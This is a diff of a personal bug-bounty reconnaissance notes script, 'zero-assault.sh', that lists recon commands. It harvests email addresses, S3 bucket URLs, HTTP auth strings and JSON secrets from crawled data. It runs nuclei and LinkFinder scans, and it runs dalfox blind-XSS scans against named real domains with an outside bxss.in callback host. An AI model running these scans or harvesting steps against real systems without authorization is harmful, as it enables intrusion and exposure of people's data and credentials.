@@ -42,7 +42,7 @@ zero-assault.sh
     enemy positions, strengths, weaknesses, and movements.
 '
 
-# /Information/
+# /Information Sources/
 filtered_hosts/
 filtered_urls/
 fff_hosts.txt/
@@ -59,27 +59,33 @@ urls*.txt
 find -type f -empty -delete
 wcall
 dig .... any
-gf s3-buckets >> ../assault_alpha/aws-s3.txt   # fff_hosts.txt/, fff_urls.txt/
-gf http-auth >> ../assault_alpha/info.txt   # fff_hosts.txt/, fff_urls.txt/
-gf urls >> ../assault_alpha/jss-urls.txt   # js/
-grep -E "https://[^/]+\.s3\.amazonaws\.com(/|$)" jss-urls.txt > jss-urls-s3.txt
-fff_urls.txt]$ gf json-sec >> ../assault_alpha/json-sec.txt
-fff_hosts.txt]$ gf json-sec >> ../assault_alpha/json-sec.txt
-js]$ gf json-sec >> ../assault_alpha/json-sec.txt 
-paramspider]$ dalfox file productboard.com.txt -b bugbountyicodeidc.bxss.in -o hasil-redacted.txt
-paramspider]$ dalfox file satismeter.com.txt -b bugbountyicodeidc.bxss.in -o hasil-redacted.txt
-grep "\.s3\." jss-urls.txt
+gf
+grep
+
+# /Extrsct Data/
+grep -rEho '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}' . | sort | uniq > zero_assault/emails.txt
+gf s3-buckets >> zero_assault/aws-s3.txt
+grep -rEho "https://[^/]+\.s3\.amazonaws\.com(/|$)" . >> zero_assault/aws-s3.txt
+grep "\.s3\." urls.txt >> zero_assault/aws-s3.txt
+gf http-auth >> ero_assault/http-auth.txt
+gf urls >> zero_assault/urls.txt
+gf json-sec >> zero_assault/json-sec.txt
 foxopen  dev.txt
 screenshot dev.txt
 nuclei -l url
+curl -X POST https://pokerman.onrender.com/logs -H "Content-Type: application/json" -d '{"name": "John Doe", "age": 45}'
+
 
 # /Analysis and Assessment Result: Find interest host/api/vulnerability/cve to scan and go deep diving./
 touch reconnaissance-note-operation-[]-Dec2024.md
+python linkfinder.py -i http://verily.com  # git clone https://github.com/GerbenJavado/LinkFinder.git
 
 
 ## Engagement
 mkdir engagement
 touch engagement/engagement-note-operation-[]-Dec2024.md
+dalfox file productboard.com.txt -b bugbountyicodeidc.bxss.in -o hasil-redacted.txt # paramspider
+
 nuclei
 Burpsuit
 dalfox
